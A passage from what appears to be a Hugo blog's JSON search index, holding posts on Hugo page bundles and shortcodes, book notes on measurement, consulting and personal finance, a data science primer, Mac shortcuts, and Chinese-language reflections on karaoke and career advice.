[{"body":"","link":"http://localhost:1313/","section":"","tags":null,"title":""},{"body":"\r","link":"http://localhost:1313/about/","section":"","tags":null,"title":"About me"},{"body":"","link":"http://localhost:1313/tags/hugo/","section":"tags","tags":null,"title":"Hugo"},{"body":"","link":"http://localhost:1313/tags/index/","section":"tags","tags":null,"title":"Index"},{"body":"","link":"http://localhost:1313/post/","section":"post","tags":["index"],"title":"Posts"},{"body":"","link":"http://localhost:1313/tags/","section":"tags","tags":null,"title":"Tags"},{"body":"Page bundles are an optional way to organize page resources within Hugo.\nYou can opt-in to using page bundles in Hugo Clarity with usePageBundles in your site configuration or in a page's front matter. Read more about usePageBundles.\nWith page bundles, resources for a page or section, like images or attached files, live in the same directory as the content itself rather than in your static directory.\nHugo Clarity supports the use of leaf bundles, which are any directories within the content directory that contain an index.md file. Hugo's documentation gives this example:\n1content 2├── about 3│ ├── index.md 4├── posts 5│ ├── my-post 6│ │ ├── content1.md 7│ │ ├── content2.md 8│ │ ├── image1.jpg 9│ │ ├── image2.png 10│ │ └── index.md 11│ └── my-other-post 12│ └── index.md 13│ 14└── another-section 15 ├── .. 16 └── not-a-leaf-bundle 17 ├── .. 18 └── another-leaf-bundle 19 └── index.md In the above example `content` directory, there are four leaf\rbundles:\rabout: This leaf bundle is at the root level (directly under content directory) and has only the index.md.\nmy-post: This leaf bundle has the index.md, two other content Markdown files and two image files. image1 is a page resource of my-post and only available in my-post/index.md resources. image2 is a page resource of my-post and only available in my-post/index.md resources.\nmy-other-post: This leaf bundle has only the index.md.\nanother-leaf-bundle: This leaf bundle is nested under couple of directories. This bundle also has only the index.md.\nThe hierarchy depth at which a leaf bundle is created does not matter, as long as it is not inside another leaf bundle.\nAdvantages to using page bundles The image below is part of the bundle of this page, and is located at content/post/bundle/building.png. Because it's within this page's bundle, the markup for the image only has to specify the image's filename, building.png.\nIf you ever change the name of the directory in which this Markdown file and the image reside, the reference to the image would not need to be updated.\nIn addition to more cleanly organizing your content and related assets, when using page bundles, Hugo Clarity will automatically generate markup for modern image formats, which are smaller in file size.\nFor instance, when you reference an image like building.png, Hugo Clarity will check to see if the same image (based on filename) exists in WebP, AVIF or JXL formats. If you inspect the image above, you'll see a \u0026lt;source\u0026gt; element for building.webp, because that file is also present. Hugo Clarity will only include the markup if these images exist.\nBrowsers that support these formats and the \u0026lt;picture\u0026gt; element will load them, while browsers that do not will fall-back to the default image. Read more about this process.\nFinally, note that page assets can be further managed and refined within the page's front matter if you wish, and are not limited to images alone.\nDisadvantages to using page bundles Page resources in a bundle are only available to the page with which they are bundled — that means you can't include an image with one page and then reference it from another.\nImages that are being used in multiple places are more appropriate for your Hugo assets directory. Unlike files in the Hugo static directory, files in the assets directory can be run through Hugo Pipes, which includes image processing.\n","link":"http://localhost:1313/post/bundle/","section":"post","tags":["hugo"],"title":"Using Hugo page bundles"},{"body":"\r","link":"http://localhost:1313/post/hugo/map/","section":"post","tags":["hugo"],"title":"Using OpenStreetMap"},{"body":"The \u0026quot;Notices\u0026quot; shortcode enables you to call out pieces of information - sidebars, warnings, tips, etc.\nTo create a notice on a page, you can use the notice shortcode.\nYou use the notice shortcode, with the first parameter being one of note, info, tip, and warning. Then add a title for your note in quotes as the second parameter. The inner body of the note can be whatever markdown you want to create.\nThe following shortcode syntax within a markdown doc:\n1{{% notice note \u0026#34;Note\u0026#34; %}} 2This is a standard \u0026#34;note\u0026#34; style. 3{{% /notice %}} will render as:\nNote\rThis is a standard \u0026quot;note\u0026quot; style.\nThe other three variants follow.\nInfo\rHere is the \u0026quot;info\u0026quot; style.\nTip\rHere is a \u0026quot;tip\u0026quot; variant of a notice.\nWarning\rHere is the \u0026quot;warning\u0026quot; flavor of a notice.\nAlso note that the content of a notice can contain anything you could put on a normal page - as shown below:\nComplex Notices are Possible!\rThis is a notice that has a lot of various kinds of content in it.\nHere is a bulleted list With more than one bullet And even more than one level Code blocks are fine here, too....\n1public void SayHello() 2{ 3 Console.WriteLine(\u0026#34;Hello, world!\u0026#34;); 4} Productivity Booster!\rIf you're using VS Code for your editing, copy the .vscode\\clarity.code-snippets file into a .vscode root folder on your repo. This will enable you to type note then \u0026lt;tab\u0026gt; then choose with up/down arrows which flavor notice you want, then \u0026lt;tab\u0026gt; again to provide a title, then \u0026lt;tab\u0026gt; to add your content!\nTo use the snippet, you need to first enable quickSuggestions for Markdown (one time only):\nGo to Preferences-\u0026gt;Settings then search for quickSuggestions Follow the link to Edit in settings.json Toward the bottom of the file, paste in the following JSON: 1\u0026#34;[markdown]\u0026#34;: { 2 \u0026#34;editor.quickSuggestions\u0026#34;: true 3 } Close and save the settings. ","link":"http://localhost:1313/post/hugo/notices/","section":"post","tags":["hugo"],"title":"Using Notices"},{"body":"","link":"http://localhost:1313/series/2021/","section":"series","tags":null,"title":"2021"},{"body":"","link":"http://localhost:1313/tags/booknotes/","section":"tags","tags":null,"title":"Booknotes"},{"body":"","link":"http://localhost:1313/categories/","section":"categories","tags":null,"title":"Categories"},{"body":"","link":"http://localhost:1313/categories/management/","section":"categories","tags":null,"title":"Management"},{"body":"Measure Anything Published: Jan 01, 2021 Tags: booknotes, process Category: Management\nIf you don't measure it, you can't manage it; If you don't measure it, you can't improve it; If you don't measure it, you probably don't care; If you can't influence it, then don't measure it.\nRandy A. Steinberg Table of Contents Why Measure Anything There is important logic, see below:\nIf it matters at all, it is detectable/observable If it is detectable, it can be detected as an amount (or range of possible amounts) If it can be detected as a range of possible amounts, it can be measured 4 useful measurement assumptions:\nyour problem is not as unique as you think you have more data than you think you need less data than you think there is a useful measurement that is much simpler than you think How to Measure Equivalent Bet Test Methods like the equivalent bet test help estimators give more realistic assessments of their uncertainty\nhttps://www.tonym-v.com/blog/2019/10/2/improve-your-estimations-with-the-equivalent-bet-test\nImportant Aspects of Measurement There are important aspects regarding to measurement:\nSystemic error/systemic bias: An inherent tendency of a measurement process to favor a particular outcome; a consistent bias Random error: An error that is not predictable for individual observations; not consistent or dependent on known variable (although such errors follow the rules of probability in large groups) Accuracy: A characteristic of a measurement having a low systemic error - that is, not consistently over - or underestimating a value Precision: A characteristic of a measurement having a low random error; highly consistent results even if they are far from the true value 3 big biases you need to control for: expectancy, selection, and observer bias\nBayesian Statistics Dealing with this prior knowledge is what is called Bayesian statistics. Bayesian statistics is a particular approach to applying probability to statistical problems.\nhttps://www.quantstart.com/articles/Bayesian-Statistics-A-Beginners-Guide/\nFrequentist statistics tries to eliminate uncertainty by providing estimates. Bayesian statistics tries to preserve and refine uncertainty by adjusting individual beliefs in light of new evidence.\nApplied Information Economic Approach Define a decision problem and the relevant variables. (Start with the decision you need to make, then figure out which variables would make your decision easier if you had better estimates of their values.) Determine what you know. (Quantify your uncertainty about those variables in terms of ranges and probabilities.) Pick a variable, and compute the value of additional information for that variable. (Repeat until you find a variable with reasonably high information value. If no remaining variables have enough information value to justify the cost of measuring them, skip to step 5.) Apply the relevant measurement instrument(s) to the high-information-value variable. (Then go back to step 3.) Make a decision and act on it. (When you’ve done as much uncertainty reduction as is economically justified, it’s time to act!) https://www.lesswrong.com/posts/ybYBCK9D7MZCcdArB/how-to-measure-anything\nEstimation Methods Lens Model: http://psychology.iresearchnet.com/industrial-organizational-psychology/i-o-psychology-assessment-intervention/lens-model/\nZ-Score: https://www.investopedia.com/terms/z/zscore.asp\nRasch Model: https://psychology.wikia.org/wiki/Rasch_model https://bookdown.org/dkatz/Rasch_Biome/\nWritten by Binwei@Shanghai\n","link":"http://localhost:1313/post/2021/measure_anything/","section":"post","tags":["booknotes","process"],"title":"Measure Anything"},{"body":"","link":"http://localhost:1313/tags/process/","section":"tags","tags":null,"title":"Process"},{"body":"","link":"http://localhost:1313/series/","section":"series","tags":null,"title":"Series"},{"body":"","link":"http://localhost:1313/series/2020/","section":"series","tags":null,"title":"2020"},{"body":"","link":"http://localhost:1313/categories/computerscience/","section":"categories","tags":null,"title":"ComputerScience"},{"body":"","link":"http://localhost:1313/tags/data/","section":"tags","tags":null,"title":"Data"},{"body":"Data Science Basic Published: Aug 02, 2020 Tags: data Category: ComputerScience\nData science involves principles, processes, and techniques for understanding phenomena via the (automated) analysis of data. This article talks about the basic part of data science.\nTable of Contents Data Driven Decision (DDD) Data-driven decision-making (DDD) refers to the practice of basing decisions on the analysis of data, rather than purely on intuition. DDD is not an all-or-nothing practice, and different firms engage in DDD to greater or lesser degrees.\nOne standard deviation higher on the DDD scale is associated with a 4%-6% increase in productivity. DDD also is correlated with higher return on assets, return on equity, asset utilization, and market value, and the relationship seems to be causal.\nData and data science capability as a strategic asset Data, and the capability to extract useful knowledge from data, should be regarded as key strategic assets.\nToo many businesses regard data analytics as pertaining mainly to realizing value from some existing data, and often without careful regard to whether the business has the appropriate analytical talent. Viewing these as assets allows us to think explicitly about the extent to which one should invest one them. Often, we don't have exactly the right data to best make decisions and/or the right talent to best support making decisions from the data.\nThe best data science team can yield little value without the appropriate data; the right data often cannot substantially improve decisions without suitable data science talent.\nAs with all assets, it is often necessary to make investments. Building a top-notch data science team is a non-trivial undertaking, but can make a huge difference for decision-marking.\nExamples Hurricane Frances\nNew York Times story from 2004.\nHurricane Frances was on its way, barreling across the Caribbean, threatening a direct hit on Florida's Atlantic coast. Residents made for higher ground, but far away, in Bentonville, Ark., executives at Wal-Mart Stores decided that the situation offered a great opportunity for one of their newest data-driven weapons ... predictive technology.\nIt might be useful to project the amount of increase in sales due to the hurricane, to ensure that local Wal-Marts are properly stocked.\nIndeed, that is what happened. The New York Times (Hays, 2004) reported that: \u0026quot;...the experts mined the data and found that the stores would indeed need certain products - and not just the usual flashlights. 'We didn't know in the past that strawberry PopTarts increase in sales, like seven times their normal sales rate, ahead of a hurricane, ' Ms. Dillman said in a recent interview. 'And the pre-hurricane top-selling items was beer'\nPredicting customer churn\nAttracting new customers is much more expensive than retaining existing ones, so a good deal of marketing budget is allocated to prevent churn. How to devise a precise, step-by-step plan for how the data science team should use company vast data resources to decide which customers should be offered the special retention deal prior to the expiration of their contracts.\nTarget\nLike most retailers, Target cares about consumers' shopping habits, what drives them and what can influence them.\nConsumers tend to have inertia in their habits and getting them to change is very difficult. Decision makers at Target knew, however, that the arrival of a new baby in a family is one point where people do change their shopping habits significantly. In the Target analyst's words, 'as soon as we get them buying diapers from us, they're going to start buying everything else too.' Since most birth records are public, retailers obtain information on births and send out special offers to the new parents.\nHowever, Target wanted to get a jump on their competition. They were interested in whether they could predict that people are expecting a baby. If they could, they would gain an advantage by making offers before their competitors. Using techniques of data science, Target analyzed historical data on customers who later were revealed to have been pregnant, and were able to extract information that could predict which consumers were pregnant. For example, pregnant mothers often change their diets, their wardrobes, their vitamin regiments, and so on.\nData Science Skills Extracting useful knowledge from data to solve business problems can be treated systematically by following a process with reasonably well-defined stages.\nData management Before doing any data analysis, the data need to be well managed.\nNormally enterprise data management includes 3 parts:\nGovernance, Architecture \u0026amp; Modeling (Preparing an Enterprise Data Strategy) Engineering \u0026amp; Administration (Managing \u0026amp; Working with Data) Business Intelligence, Analytics \u0026amp; Predictive Modeling (Getting Value from Data) Examples of Data Governance Policies\nCorporate glossary Naming conventions Change management Enterprise data dictionary Information security Data project management Roles in a data governance program\nCDO Data governance director Data stewards Subject matter experts (SME) Enterprise information architect Data modeler Extract, Transform, Load ELT tools\nInformatica Syncsort dmx and dmx-h Microsoft SSIS IBM infosphere datastage Talend Pentaho data integration Apache camel For different kinds of data types, the ways to handle them are different.\nMaster: Customer, Hotel, Sensor Transactional: Purchase, Check-in, Auto-order Lookup: Describes codes/IDs, FK relationships, \u0026quot;w\u0026quot; = \u0026quot;work phone\u0026quot; Metadata: Table data object, Description, Data type = \u0026quot;string\u0026quot; Data Analysis Data mining The Cross Industry Standard Process for Data Mining, abbreviated CRISP-DM is one codification of this process. Keeping such a process in mind provides a framework to structure our thinking about data analytics problems.\nData profiling\nData profiling refers to dimensions of data quality that can be measured and quantified without considering the intended use of the data. Data profiling techniques are largely generic across applications and do not quantify data quality. Rather, data profiling provides indicators of potential data quality issues and offers a general assessment of data reliability.\nSupervised\nDecision tree Naïve bayes classification Regression SVM Unsupervised\nAnomaly detection Clustering k-means clustering k-nn (nearest neighbours) Semi-supervised learning Besides the above, there are other technologies like Reinforced Learning, Deep Learning, and many others.\nData relevant career For various skills in data science, the following pictures show clearly how useful they are and how easy to learn.\nThere are different roles relevant to data:\nBusiness understanding Data Acquisition Data Cleanup Modeling Analysis Deployment For above:\n1, 5: Business Analyst 2, 3: Data engineering 4: Data scientist Written by Binwei@Singapore\n","link":"http://localhost:1313/post/2020/data_science_basic/","section":"post","tags":["data"],"title":"Data Science Basic"},{"body":"","link":"http://localhost:1313/tags/chinese/","section":"tags","tags":null,"title":"Chinese"},{"body":"Enlightenment from Singing Published: Aug 01, 2020 Tags: chinese Category: Life\nRecently, I have been using app \u0026quot;QuanMinKGe\u0026quot; to sing for fun quite a lot. I got some enlightenment from playing this app, and write it down as this blog.\n全民k歌 刚接触全民k歌应该是在16年底，那个时候的宗旨就是两个字：白玩。坚决不给平台充钱。 自己录歌玩，和几个有限好友之间互动一下，然后领一些免费花花送人玩。 然后用的版本是个几年前非常老的版本，从来没有升级。\n其实当然知道自己不充钱，就是知道是靠着别的玩家砸钱支持平台，我来蹭。 有些朋友喜欢充钱玩币的，我也是解释一番，坚持不充钱。\n升级后发现 自从19年底换了新的手机以后(iPhone 11)，全民k歌装了个新版本，然后突然一下感觉打开了一个新的天地。\n主要是发现原来之前朋友送我的币，都会部分返还给我。 然后系统还送了我若干花花绿绿的免费礼物。 这种感觉就像是一下子暴发户一下子突然有钱了一样。\n这个时候才真正领会到之前有些朋友对我的建议。 然后娱乐性也感觉一下子提高了好多，去歌房里频繁了，慢慢得了些门道，认识了一些新的朋友。 等上边礼物送完了以后，也终于没忍住冲了第一次人民币。\n小感悟 这几个月玩得比较疯，也有了一些自己的新感悟。在此总结下：\n免费玩法省钱，但会影响体验，因为在心态上没发完全放下。不停得和玩币的朋友解释，而且很多规则都不懂，在全民k歌的世界中会有一种低人一等的感觉。自己投入时间，却不是理想的体验 软件版本的更新很重要，始终要老版本的app，除非甘于一个人默默唱歌，做个世外高人，否则别人的各种新功能可能都不知道怎么回事 歌房非常适合与人交流，虽说不能直接提高歌唱水平，不过可以知道新歌动态之类的，可以知道很多好听的歌，新的伴奏，尝试很多新的唱法， 但是也会耽误学新歌，因为在歌房唱歌和别人互动很容易上瘾，没有时间好好学习新歌 手中有些k币礼物，确实会帮助到社交，全民设计这套系统确实充分考虑到了心理学，社会学各方面，让大家不得不乖乖掏钱。我一直坚持不掏钱坚持了两年，最后还是掏钱，足够说明这套机制的设计有其合理的方面 之前由于圈子的限制，想去歌房，会盼星星盼月亮等一些朋友在歌房唱或者开歌房，然后进去唱，很珍惜这种机会。在一个微信群里也特别希望有些新的消息。等后来圈子大了以后，真的这些都不是个事，只是觉得消息好多，根本看不过来。比如一开始认识个喜欢唱邓丽君的女生，唱得很好，如获至宝，后来很长时间不看到她玩，觉得每天都在等她，很失落。但这个状态在社交圈拓展以后明显滴改进了，不会再那么依赖于一个人 在全民的这些经验是不是可以也能适用在现实生活中呢？\nWritten by Binwei@Singapore\n","link":"http://localhost:1313/post/2020/enlightenment_from_singing/","section":"post","tags":["chinese"],"title":"Enlightenment from Singing"},{"body":"","link":"http://localhost:1313/categories/life/","section":"categories","tags":null,"title":"Life"},{"body":"","link":"http://localhost:1313/tags/efficiency/","section":"tags","tags":null,"title":"Efficiency"},{"body":"Mac Tips Published: Jul 31, 2020 Tags: efficiency Category: ComputerScience\nI got first Macbook 3 years ago, but only use Macbook as production environment 9 months ago. In order to use Macbook in an efficient way, some tips can be important to know.\nShort cut keys Capture window +-------------------------------+-----------------------------------+ | Command + Shift + 5 | Record video for screen | +-------------------------------+-----------------------------------+ | Command + Shift + 4 | Capture screen to file | +-------------------------------+-----------------------------------+ | Command + Shift + 4 + space | Capture current screen | +-------------------------------+-----------------------------------+ | Command + Control + Shift + 4 | Capture screen to clip-board | +-------------------------------+-----------------------------------+\nFinder +-------------------------------+-----------------------------------+ | Command + Shift + G | Jump to any folder | +-------------------------------+-----------------------------------+ | Command + up/down | Jump to parent or sub folder | +-------------------------------+-----------------------------------+ | Command + shift + . | Show hidden files | +-------------------------------+-----------------------------------+\nSafari +-------------------------------+-----------------------------------+ | Command + + | Zoom in | +-------------------------------+-----------------------------------+ | Command + - | Zoom out | +-------------------------------+-----------------------------------+\nOperating System +-------------------------------+-----------------------------------+ | Fn + Delete | Delete the character after | +-------------------------------+-----------------------------------+ | Command + tab | Switch between applications | +-------------------------------+-----------------------------------+ | Command + ~ | Switch between windows in app | +-------------------------------+-----------------------------------+ | Command + h | Hide current window | +-------------------------------+-----------------------------------+ | Command + m | Minimize current window | +-------------------------------+-----------------------------------+ | Command + Option + ^ | Sleep | +-------------------------------+-----------------------------------+ | Control + Shift + ^ | Turn off screen | +-------------------------------+-----------------------------------+ | Command + W | Close current window | +-------------------------------+-----------------------------------+ | Command + Q | Close current application | +-------------------------------+-----------------------------------+ | Command + Shift + Y | Generate note from selected text | +-------------------------------+-----------------------------------+ | Ctrl + Left or right | Switch screen | +-------------------------------+-----------------------------------+ | Command + Option + D | Show/Hide docker | +-------------------------------+-----------------------------------+\nUseful tips Switch OS in BootCamp During start-up, press option key\nSpace 几乎所有文件都可以用空格键来预览，而且可以用上下键切换\nTouchbar 可以定制，Fn press 会在Touch Bar显示Fx功能键\nSpotlight Highlight a file and Command to see the path, or Command + R jump to the folder\nTrack pad 三指往上推，Mission Control\nMirror/split screen Use QuickTime player can mirror iphone screen to Macbook 长按最大化按钮可以做到分屏 Sidecar和iPad分屏操作 提取pdf部分页面 可以用Preview -\u0026gt; 缩图清单，选取提取页面，拖拽到桌面即可\n删除文件夹 rm -rf xxx\nWritten by Binwei@Singapore\n","link":"http://localhost:1313/post/2020/mac_tips/","section":"post","tags":["efficiency"],"title":"Mac Tips"},{"body":"About Consulting Published: Jul 10, 2020 Tags: consulting, booknotes Category: Management\nThis blog contains notes from several books relevant to consulting.\nTable of Contents 麦肯锡工具 我们可能会变得冲动进行激烈的争辩以使他人接受自己的观点。 不过，最好的办法是说出自己的观点，把问题本身和提出问题的人相分离，然后从正反两面对观点展开讨论，重点关注积极的方面\n信任，但要确认\n5P原则 认真准备（prepare）：观察身边之人的积极行为并了解他们的背景 他人为重（put others first）：这是生活中需要遵循的普遍法则 真诚赞美（praise sincerely）：与他人分享你的发现，但切忌过分与虚伪 勿施压于人（pressure no one）：互动时，避免谈及令人尴尬的话题和靠得太近 提供帮助（provide value）：为了强化你的成果，还要设法长期提供帮助 关于汇报 从项目开始实施的第一天起，就应该开始准备最终汇报\n一天绘制一张图表这样的说法，旨在强调用图表形式记录你的观察和想法的重要性。 实际上，你每天可能需要绘制很多这样的草图\nTeam Talk\n沟通不息 用心倾听 人事分离 Evaluate\n讨论团队协作状态 确定期望与监控完成情况 明确个人发展目标并相应调整工作计划 Assist\n充分利用专场 各司其职 实时反馈 Motivate\n确定个性化激励因素 积极正面影响团队成员 庆祝成就 Focus Frame\n明确关键问题 创建议题树 形成基本假设 Organize\n创建总体流程图 制定内容计划以检验假设 设计故事线索 Collect\n通过“草图”呈现必须数据 进行针对性的访谈 收集第三方数据，资料 Understand\n明确“so what” 理清对项目相关方面的启示 记录所有图表中的核心见解 Synthesize\n获取意见，确保认可 提供具体的改进建议 讲述一个好故事 咨询的奥秘 其实，咨询的奥秘不也就是如何提升个人竞争力并拥有良好人际关系的奥秘吗？ 也就是说，咨询的奥秘就是让我们对自己和他人都感觉良好，并且体验希望和目标得以实现的奥秘\n咨询的定义：应人们的要求去影响他们的艺术\n人本身就是产品。 努力使自己成长为更真实，更完整的人，是最佳的商业策略。\n由于我们出售的是无形的服务，因此客户无法知道他们将得到什么以及是否能从中获益。。。 我们越直率，就越容易搞好人际关系，就越自信和自知，客户也就更容易相信我们信守承诺，把我们当作自己的依靠和榜样\n别指望通过阅读，聆听或记忆“智慧的词句”，就可以轻易从他人智慧宝盒中获得智慧。 智慧源自亲身经历，词句也许是其中的调味品，但也仅仅是调味品而已。 记住，只有调味品并不能维持生存\n当不再学到新东西时，就该换换方向了\nFEAR=Find Every Available Resources\n如果不知道自己想要什么，你就不大可能得到它\n能够容纳一种思想而又不接受它是有教养的人的标志\n亚里士多德 提供帮助和新的解决问题的方法是咨询顾问的工作。 然而为了取得成功，咨询顾问在构思和启动工作时，还需要考虑到前面提到的客户头脑中的顾虑。 当客户需要得到咨询顾问的时候，他会这样说或者暗示出来：”我需要你，但我不能直说，所以需要你找到一种不破坏我价值感的方式来帮助我。“ 聪明的咨询顾问会用一种既承认客户的自身价值又不违背自己原则的方式来回答，否则的话，就不会有真正的或是长久的改变发生。\n作为聪明的咨询顾问，温伯格用不同的方式阐明了咨询的关键所在。 他指出了成功消除客户顾虑的有效而有趣的途径，并经常表扬那些知道应该在什么时候向什么人寻求帮助的客户，认为这是高智商而不是缺乏竞争力的表现。 通过这种方式，客户和顾问都在不断学习和成长，每个人都会感觉良好。 其实，咨询的奥秘不也就是如何提升个人竞争力并拥有良好人际关系的奥秘吗？ 也就是说，咨询的奥秘就是让我们对自己和他人都感觉良好，并且体验希望和目标得以实现的奥秘。\n由于每个智慧宝盒都只适用于特定的个人，因此你不能用自己的智慧宝盒来判断他人。 看在上帝的份上，当认为他人的举措并不明智时，请你一定不要自以为是。这时，自以为是的态度甚至还不如正直的态度。\n咨询中最糟糕的’心‘的问题之一就是把自己的价值观强加给客户\n春秋战国时期的咨询师 中国先秦时期，有贵族养门客的制度。有些好的门客有可以给主公办事，还是好的咨询师，提供建议甚至于影响主公的三观。 比如以下这段是史记中说的孟尝君和门客冯驩的故事，实在是把一个优秀咨询师的形象描写得栩栩如生。\n孟尝君，名文，姓田氏。 齐王惑于秦、楚之毁，以为孟尝君名高其主而擅齐之权，遂废孟尝君。 诸客见孟尝君废，皆去。 冯驩乃西说秦王曰：“王亦知齐之废孟尝君乎？使齐重于天下者，孟尝君也。今齐王以毁废之，其心怨，必背齐；背齐入秦，则齐之情，人事之诚，尽委之秦，齐地可得也。君急使使载币阴迎孟尝君，不可失时也。” 秦王大悦，乃遣车十乘黄金百镒以迎孟尝君。 冯驩辞以先行，至齐，说齐王曰：“今臣窃闻秦遣使车十乘载黄金百镒以迎孟尝君。孟尝君不西则已，西入相秦则天下归之，临淄、即墨危矣。王何不先秦使之未到，复孟尝君，折秦之谋，而绝其霸强之略。” 齐王曰：“善。” 王召孟尝君而复其相位，而与其故邑之地，又益以千户。\n自齐王毁废孟尝君，诸客皆去。 后召而复之，冯驩迎之。 未到，孟尝君太息叹曰：“文常好客，遇客无所敢失，食客三千有余人，先所知也。客见文一日废，皆背文而去，莫顾文者。今赖先得复其位，客亦有何面目复见文乎？如复见文者，必唾其面而大辱之。” 冯驩结辔下拜。孟尝君下车接之，曰：“先生为客谢乎？”冯驩曰：“非为客谢也，为君之言失。夫物有必至，事有固然，君知之乎？”孟尝君曰：“愚不知所谓也。” 曰：“生者必有死物之必至也富贵多士贫贱寡友事之固然也。君独不见夫朝趣市者乎？明旦，侧肩争门而入；日暮之后，过市朝者掉臂而不顾。非好朝而恶暮，所期物忘其中。今君失位，宾客皆去，不足以怨士而徒绝宾客之路。愿君遇客如故。” 孟尝君再拜曰：“敬从命矣。闻先生之言，敢不奉教焉。”\nWritten by Binwei@Singapore\n","link":"http://localhost:1313/post/2020/about_consulting/","section":"post","tags":["booknotes","consulting"],"title":"About Consulting"},{"body":"","link":"http://localhost:1313/tags/consulting/","section":"tags","tags":null,"title":"Consulting"},{"body":"Book note: Xiao Gou Qian Qian Published: Jul 09, 2020 Tags: investment Category: Life\nXiao Gou Qian Qian is the Chinese name of the book: Ein Hund Namens Money\nTable of Contents 梦想可视化 梦想 1 - 房子 房子小区环境优美，有个宽敞的客厅，温馨的卧室，和放满书的书房。\n梦想 2 - 事业 有个豪华的独立办公室，以及很强的影响力。\n梦想 3 - 魅力 富有魅力，坚持锻炼。\n你必须设想自己已经拥有了这些东西，这样你的一个小愿望就会变成渴望。 最重要的是，你要确定你想要的是什么。\n付诸于行动 你是否能够挣到钱，最关键的因素并不在于你是不是有一个好点子。 你有多聪明也不是主要原因，决定因素是你的自信程度。 一个人把精力集中在自己所能做的，知道的和拥有的东西上的那一天起，他的成功就已经拉开了序幕。 这也使得一个孩子完全有能力比成人挣到更多的钱。\n首先，你应该在自己遇到困难的时候，仍然坚持自己的意愿。 当一切正常的时候，每个人都能做到这一点。 可是当真正的困难出现的时候，才见了分晓。 情况顺利的时候，人人都能挣到钱，只有在逆境中，一切才能见分晓。 当你决定做一件事情的时候，你必须在72小时之内完成它，否则你很可能就永远不会再做了\n我生命中最美好的事情的出现，是因为我做了我不敢做的事。 最珍贵的礼物是我们自己争取来的。克服了丢面子的恐惧，世界就会像你敞开大门！\n恐惧总是在我们设想事情会如何不顺的时候出现。我们对失败的可能性想得越多，就会越害怕。\n关于投资 基金就像一口大锅，许多投资人把钱投进去。 因为这些人没有时间，没有相关的知识或者没有兴趣去亲自买股票。 这口锅里的钱交给金融界里的专家，也就是所谓的基金经理人，去投资买股票。 国家对此进行严格的监督，基金经理人必须遵守一定的规则。比如，他们至少必须酌买20种不同的股票。\n挑选基金时的注意事项：\n基金应该至少有十年历史。即使它在这么长时间内一直有丰厚的盈利，那我们可以认为，它在未来也会运作良好 应该选择大型的跨国股票基金。这种基金在世界各地购买股票，以此分散风险，所以十分安全 对基金的走势图进行比较，我们应该观察在过去10年间哪些基金的年终获利最好。 用72除以投资的年收益率的百分比，得出的数字就是这笔钱翻一倍所要的年数\n50%的钱用于投资-让鹅成长，40%钱存起来用于购买自己的需要的东西-实现目标，10%日用零花\n银行存折 “吞钱机器”\n不要为失去的东西而忧伤，而要对拥有它的时光心存感激\nWritten by Binwei@Singapore\n","link":"http://localhost:1313/post/2020/xiao_gou_qian_qian/","section":"post","tags":["investment"],"title":"Book note: Xiao Gou Qian Qian"},{"body":"","link":"http://localhost:1313/tags/investment/","section":"tags","tags":null,"title":"Investment"},{"body":"","link":"http://localhost:1313/tags/career/","section":"tags","tags":null,"title":"Career"},{"body":"Intelligent Web Sentences Published: Jun 07, 2020 Tags: career Category: Life\nI read a lot on Zhihu and Quora, and collect the followings intelligent sentences, even though they are not written by famous people. They are full of wisdom, and mixed with Chinese and English.\nTable of Contents Career Choose to learn There are a lot of things to learn, then what to choose?\nE = I x L / T\nI = Money, cash, income, potential income L = Lifespan, duration, how long until obsolescence T = Time spent learning, learning curve, investment E = Efficiency, return on investment Of course, you also need to combine with your own interests and do not let the learning becomes your burden.\nAlso needs to combine with overall demand/supply in the labor market, see following salary ‘truth’ table\nTo whatever degree your career depends on technical ability, all else being equal, you have following choices:\nfocus on getting stronger choose a space with less competition 稀缺性 没有需求，就没有价值，这是一切的基础。 在不同的场景，人对同一件事物可能会触发不同的需求。不同的需求导致价值判断的标准不同。\n一杯咖啡在你家是咖啡，在星巴克里就是社交方式； 一杯水在你家里是饮用水，在沙漠里就是命。 如何提高自己未来的竞争力？ 你有没有价值？你的能力是否是其他人需要的？ 更关键的是，你值多少钱，竞争力有多强，是由你的能力是否是稀缺决定的\n打造稀缺性有两个方法\n成为第一 成为唯一 每多一个能力，你的不可替代性将会大幅度增加。 所以，让自己变得稀缺最好的办法，就是让自己拥有多维度能力！ 多维能力要发挥价值，需要2个重要的前提条件\n每个能力至少都是有价值的，也就是别人是需要的 每个能力之间要有关联 打造多维能力的步骤\n先把一个能力打造成自己的长板 让自己兴趣广泛 确定一个目标，并把多维能力组合起来 提高竞争力 大方向要选好，方向不对、努力白费，看准一个行业，就持续的做，不能隔三差五换行业。不管是职场或是创业，长时间保持专注都是做出成绩的必要素质 精要主义，当前是互联网时代，信息爆炸，获取知识特别容易了，但每个人的时间和精力都是有限的，不能什么都想学，什么都不专，各行各业都在朝着细分化、精细化发展，让自己成为一个细分领域的专家，好过什么都懂一点，但什么都做不好。 在选定的领域内要广泛涉猎 建立可以迁移的能力，建立个人品牌终身为你创造价值。 做可积累的事情，想想看五年前你学的东西和你做的工作，对今天的你有没有帮助？ 早知三日富贵十年其实说的就是对趋势的敏感度和把握度 长期视角，我们要学会跳出自己的轨道，从一个局外人的视角看自己所从事的职业或事业，尝试培养一种时空穿越的超能力，复盘一下自己的发展历程，假设你已经知道了今天的结果，如果给你一次机会倒回五年前或十年前，你会怎么做 化繁为简，有目的的做事。所以减少无效社交、减少社交媒体、降低把时间分割成碎片的概率，分清先后次序，一切都围绕这最重要的那件事情，也就是能够实现价值最大化的事情。 拒绝眼前的诱惑，必须利用好八小时以外的时间学习、训练一项长期技能，获得跳板和杠杆，步步为营渐入佳境 整合资源输出产品的能力 最直观的竞争力体验在价值和价格上面，让你的服务在你的领域具备高性价比和不可替代性， 逆向思维能力 杠杆他人和时间的能力，单打独斗再强也不可能做成大事，完成早期技术经验的积累后，必须建立复利思维，杠杆更多的人一起做一件事情，在你没有找到杠杆和复利建立起被动收入之前，你不可能实现财务自由 稳定的普世价值观是一种隐形竞争力，比如诚信、正直、利他、不违背良心……很多时候这比技能更重要，正所谓小胜靠智大胜靠德 坚持运动、健康饮食，健康的身体会帮助你保持活力和自信，是一切的基础！ 谁掌握的稀缺性资源越多，谁利用资源的效率越高，谁就更具有争取社会财富的能力。 重复练习，进入一个领域，学习一门技能，反复练习是成为专家最笨但也是最快的手段 捷径就是最大的弯路 价值导向、结果导向 创业是挑战新的关卡，就像游戏一样，已经驾轻就熟了，紧着不解锁新地图也就没意思了，所以创业是优秀的升华，价值更大化的体现 如何写好简历 工作经历：每一份工作经历的描写，都用到了STAR法则\nSituation: 事情是在什么情况下发生 Task: 你是如何明确你的任务的 Action: 